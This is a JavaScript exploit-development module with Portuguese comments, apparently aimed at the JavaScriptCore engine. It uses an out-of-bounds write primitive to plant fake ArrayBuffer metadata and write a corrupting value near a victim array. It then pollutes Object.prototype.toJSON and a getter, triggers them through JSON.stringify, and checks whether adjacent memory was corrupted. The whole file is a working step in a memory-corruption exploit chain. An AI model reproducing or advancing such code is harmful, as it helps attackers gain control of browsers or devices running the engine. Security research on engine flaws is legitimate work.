// js/script3/testRetypeOOB_AB_ViaShadowCraft.mjs
import { logS3, PAUSE_S3 } from './s3_utils.mjs'; // Removido MEDIUM e SHORT se não usados aqui
import { AdvancedInt64, toHex } from '../utils.mjs'; // Removido isAdvancedInt64Object se não usado aqui
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_dataview_real,
    oob_write_absolute,
    oob_read_absolute, // Pode ser usado para inspecionar a vítima se tivermos um leak de endereço
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';

const GETTER_CHECKPOINT_PROPERTY_NAME = "AAAA_GetterForRetypeCheck";
let retype_getter_called_flag = false;
// Resultados globais para este teste focado na corrupção da vítima
let victim_corruption_test_results = { observed_corruption: false, message: "Teste não iniciado ou getter não chamado." };

// O ArrayBuffer vítima não precisa ser global para este teste, será criado e acessado no escopo do teste.

const ENDERECO_INVALIDO_PARA_LEITURA_TESTE_SOMBRA = new AdvancedInt64(0x1, 0x0);
const TAMANHO_ESPERADO_SOMBRA = new AdvancedInt64(0x1000, 0x0);


class CheckpointObjectForRetype {
    constructor(id) {
        this.id = `RetypeCheckpoint-${id}`;
        this.marker = 0xD0D0D0D0;
    }
}

// Variável para manter a referência ao array vítima entre a criação e o acesso no getter
let simple_victim_array_ref;

export function toJSON_TriggerRetypeCheckpointGetter() {
    const FNAME_toJSON = "toJSON_TriggerRetypeCheckpointGetter";
    logS3(`toJSON_TriggerRetypeCheckpointGetter: 'this' é: ${Object.prototype.toString.call(this)}, id: ${this?.id}, é CheckpointObject?: ${this instanceof CheckpointObjectForRetype}`, "info", FNAME_toJSON);
    if (this instanceof CheckpointObjectForRetype) {
        logS3(`toJSON_TriggerRetypeCheckpointGetter: 'this' É CheckpointObject. Acessando getter '${GETTER_CHECKPOINT_PROPERTY_NAME}'...`, "info", FNAME_toJSON);
        try {
            // eslint-disable-next-line no-unused-vars
            const val = this[GETTER_CHECKPOINT_PROPERTY_NAME]; // Aciona o getter
        } catch (e) {
            logS3(`toJSON_TriggerRetypeCheckpointGetter: Erro ao acessar getter: ${e.message}`, "error", FNAME_toJSON);
        }
    }
    return this.id;
}


export async function executeRetypeOOB_AB_Test() {
    const FNAME_TEST = "executeVictimArrayCorruptionTest"; // Nome do teste atualizado
    logS3(`--- Iniciando Teste de Corrupção de Array Vítima Adjacente ---`, "test", FNAME_TEST);

    retype_getter_called_flag = false; // Usaremos esta flag para saber se o getter foi chamado
    victim_corruption_test_results = { observed_corruption: false, message: "Teste não executado ou getter não chamado." };

    // Validações de Config (mantidas, embora o foco não seja re-tipar o oob_ab)
    if (!JSC_OFFSETS.ArrayBufferContents /* ... etc ... */) {
        logS3("Offsets críticos não definidos. Abortando.", "critical", FNAME_TEST);
        return;
    }

    let toJSONPollutionApplied = false;
    let getterPollutionApplied = false;
    let originalToJSONProtoDesc = null;
    let originalGetterDesc = null;
    const ppKey_val = 'toJSON';

    // 1. Criar o array vítima ANTES de qualquer operação OOB significativa
    const original_victim_values = [0x11223344, 0x55667788, 0x99AABBCC, 0xDDEEFF00];
    simple_victim_array_ref = [...original_victim_values]; // Copia para referência
    logS3(`Array vítima criado com ${simple_victim_array_ref.length} elementos: [${simple_victim_array_ref.map(toHex).join(', ')}]`, "info", FNAME_TEST);


    try {
        await triggerOOB_primitive(); // Configura oob_array_buffer_real e oob_dataview_real
        if (!oob_array_buffer_real || !oob_dataview_real) {
            victim_corruption_test_results = { observed_corruption: false, message: "Falha ao inicializar OOB." };
            logS3(victim_corruption_test_results.message, "critical", FNAME_TEST);
            return;
        }
        logS3(`Ambiente OOB inicializado. oob_ab_len: ${oob_array_buffer_real.byteLength}, oob_dv_len: ${oob_dataview_real.byteLength}`, "info", FNAME_TEST);

        // Plantar metadados sombra (pode não ser usado diretamente, mas mantém a configuração)
        const shadow_metadata_offset_in_oob_data = 0x0;
        oob_write_absolute(shadow_metadata_offset_in_oob_data + JSC_OFFSETS.ArrayBufferContents.SIZE_IN_BYTES_OFFSET_FROM_CONTENTS_START, TAMANHO_ESPERADO_SOMBRA, 8);
        oob_write_absolute(shadow_metadata_offset_in_oob_data + JSC_OFFSETS.ArrayBufferContents.DATA_POINTER_OFFSET_FROM_CONTENTS_START, ENDERECO_INVALIDO_PARA_LEITURA_TESTE_SOMBRA, 8);
        logS3(`Metadados sombra (não usados neste teste): ptr=${ENDERECO_INVALIDO_PARA_LEITURA_TESTE_SOMBRA.toString(true)}, size=${TAMANHO_ESPERADO_SOMBRA.toString(true)}`, "info", FNAME_TEST);

        // A escrita OOB "gatilho" no offset 0x70 do oob_array_buffer_real
        const corruption_trigger_offset_abs = (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16; // 0x70
        const corruption_value = new AdvancedInt64(0xFFFFFFFF, 0xFFFFFFFF);
        logS3(`Realizando escrita OOB gatilho em offset ${toHex(corruption_trigger_offset_abs)} do oob_ab_data com valor ${corruption_value.toString(true)}`, "info", FNAME_TEST);
        oob_write_absolute(corruption_trigger_offset_abs, corruption_value, 8);
        logS3(`Escrita OOB gatilho completada.`, "info", FNAME_TEST);


        // Configurar o getter e poluir (como antes, para acionar o ponto de verificação)
        const checkpoint_obj = new CheckpointObjectForRetype(1); // Objeto para acionar o getter
        originalGetterDesc = Object.getOwnPropertyDescriptor(CheckpointObjectForRetype.prototype, GETTER_CHECKPOINT_PROPERTY_NAME);

        Object.defineProperty(CheckpointObjectForRetype.prototype, GETTER_CHECKPOINT_PROPERTY_NAME, {
            get: function() {
                retype_getter_called_flag = true;
                const FNAME_GETTER = "VictimCheckGetter";
                logS3(`Getter "${GETTER_CHECKPOINT_PROPERTY_NAME}" FOI CHAMADO! Verificando array vítima...`, "vuln", FNAME_GETTER);
                
                victim_corruption_test_results = { observed_corruption: false, message: "Getter chamado. Verificando vítima..." };

                try {
                    logS3(`DENTRO DO GETTER: Array vítima original: [${original_victim_values.map(toHex).join(', ')}]`, "info", FNAME_GETTER);
                    logS3(`DENTRO DO GETTER: Array vítima atual (simple_victim_array_ref) tem tamanho: ${simple_victim_array_ref.length}`, "info", FNAME_GETTER);
                    let changed = false;
                    let errors_accessing = false;
                    let current_values_str = [];

                    for (let i = 0; i < original_victim_values.length; i++) {
                        try {
                            let current_val = simple_victim_array_ref[i];
                            current_values_str.push(toHex(current_val));
                            if (current_val !== original_victim_values[i]) {
                                changed = true;
                                logS3(`DENTRO DO GETTER: CORRUPÇÃO OBSERVADA! simple_victim_array_ref[${i}] = ${toHex(current_val)} (esperado ${toHex(original_victim_values[i])})`, "vuln", FNAME_GETTER);
                            }
                        } catch (e) {
                            errors_accessing = true;
                            current_values_str.push("ERRO_AO_ACESSAR");
                            logS3(`DENTRO DO GETTER: Erro ao acessar simple_victim_array_ref[${i}]: ${e.message}`, "error", FNAME_GETTER);
                        }
                    }
                     // Verificar se o tamanho mudou (mais difícil de detectar sem OOB read no array header)
                    if (simple_victim_array_ref.length !== original_victim_values.length) {
                        changed = true;
                        logS3(`DENTRO DO GETTER: CORRUPÇÃO DE TAMANHO! simple_victim_array_ref.length = ${simple_victim_array_ref.length} (esperado ${original_victim_values.length})`, "vuln", FNAME_GETTER);
                    }

                    logS3(`DENTRO DO GETTER: Array vítima atual valores: [${current_values_str.join(', ')}]`, "info", FNAME_GETTER);

                    if (changed || errors_accessing) {
                        victim_corruption_test_results.observed_corruption = true;
                        victim_corruption_test_results.message = `Corrupção ou erro de acesso observado no array vítima. Tamanho: ${simple_victim_array_ref.length}, Valores: [${current_values_str.join(', ')}]`;
                    } else {
                        victim_corruption_test_results.message = "Nenhuma corrupção óbvia observada no array vítima.";
                    }

                } catch (e) {
                    logS3(`DENTRO DO GETTER: Erro geral ao inspecionar array vítima: ${e.message}`, "error", FNAME_GETTER);
                    victim_corruption_test_results = { observed_corruption: true, message: `Erro ao inspecionar array vítima: ${e.message}` };
                }
                return 0xBADF00D;
            },
            configurable: true
        });
        getterPollutionApplied = true;

        originalToJSONProtoDesc = Object.getOwnPropertyDescriptor(Object.prototype, ppKey_val);
        Object.defineProperty(Object.prototype, ppKey_val, {value: toJSON_TriggerRetypeCheckpointGetter, writable: true, enumerable: false, configurable: true});
        toJSONPollutionApplied = true;
        logS3(`Poluições aplicadas.`, "info", FNAME_TEST);

        logS3(`Chamando JSON.stringify(checkpoint_obj) para acionar getter...`, "info", FNAME_TEST);
        try {
            JSON.stringify(checkpoint_obj);
        } catch (e) {
            logS3(`Erro durante JSON.stringify: ${e.message}`, "error", FNAME_TEST);
        }

    } catch (mainError) {
        logS3(`Erro principal no teste: ${mainError.message}`, "critical", FNAME_TEST);
        console.error(mainError);
        victim_corruption_test_results = { observed_corruption: false, message: `Erro crítico no fluxo: ${mainError.message}` };
    } finally {
        // Restauração
        if (toJSONPollutionApplied && Object.prototype.hasOwnProperty(ppKey_val)) { /* ... */ }
        if (getterPollutionApplied && CheckpointObjectForRetype.prototype.hasOwnProperty(GETTER_CHECKPOINT_PROPERTY_NAME)) { /* ... */ }
        logS3("Limpeza de poluição finalizada.", "info", "CleanupFinal");
    }

    if (retype_getter_called_flag) {
        if (victim_corruption_test_results.observed_corruption) {
            logS3(`RESULTADO TESTE VÍTIMA: ${victim_corruption_test_results.message}`, "vuln", FNAME_TEST);
        } else {
            logS3(`RESULTADO TESTE VÍTIMA: Getter chamado, mas ${victim_corruption_test_results.message}`, "warn", FNAME_TEST);
        }
    } else {
        logS3("RESULTADO TESTE VÍTIMA: Getter NÃO foi chamado.", "error", FNAME_TEST);
    }
    logS3(`  Detalhes finais da tentativa: ${JSON.stringify(victim_corruption_test_results)}`, "info", FNAME_TEST);

    clearOOBEnvironment();
    simple_victim_array_ref = null; // Limpa a referência
    logS3(`--- Teste de Corrupção de Array Vítima Concluído ---`, "test", FNAME_TEST);
}
